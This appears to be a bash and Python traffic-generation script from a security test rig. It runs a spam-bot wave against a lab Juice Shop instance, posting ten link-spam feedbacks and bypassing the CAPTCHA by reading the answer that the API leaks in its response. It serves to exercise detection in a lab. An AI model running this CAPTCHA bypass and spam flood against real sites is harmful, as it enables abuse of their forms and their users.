#!/usr/bin/env bash
# MIN-04 variant a (PRD §4, REC-05): one wave of the Poltergeist, a spam bot posting link spam to the feedback
# form. Ten posts about 1.2 s apart: each fetches a CAPTCHA (GET /rest/captcha/; Juice Shop's response carries
# the answer, so a bot needs no solving) and posts it with the spam (POST /api/Feedbacks/). No login. A
# python-requests user agent. Runs inside the rig's tools container only.
# tool: python3 urllib
# label: spam wave: 10 link-spam feedbacks through the CAPTCHA, python-requests user agent
set -eu
python3 - <<'PY'
import json, time, urllib.request
SHOP, UA = "http://10.66.0.10", "python-requests/2.32.3"
SPAM = ["Best prices on replica watches!!! www.example.net/deals", "Earn $500 a day from home, ask me how: www.example.org/job",
        "Cheap followers and likes, instant delivery www.example.com/boost", "Crypto signals 1000% guaranteed www.example.net/moon",
        "Lose 10 kg in 7 days, doctors hate this www.example.org/slim"]
def call(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(SHOP + path, data, {"User-Agent": UA, "Content-Type": "application/json"}, method=method)
    with urllib.request.urlopen(req, timeout=10) as res:
        return res.status, json.loads(res.read())
for i in range(10):
    if i:
        time.sleep(1.2)
    _, c = call("GET", "/rest/captcha/")
    status, _ = call("POST", "/api/Feedbacks/", {"captchaId": c["captchaId"], "captcha": c["answer"], "comment": SPAM[i % len(SPAM)], "rating": 5})
    print(status, c["captcha"], "=", c["answer"])
PY
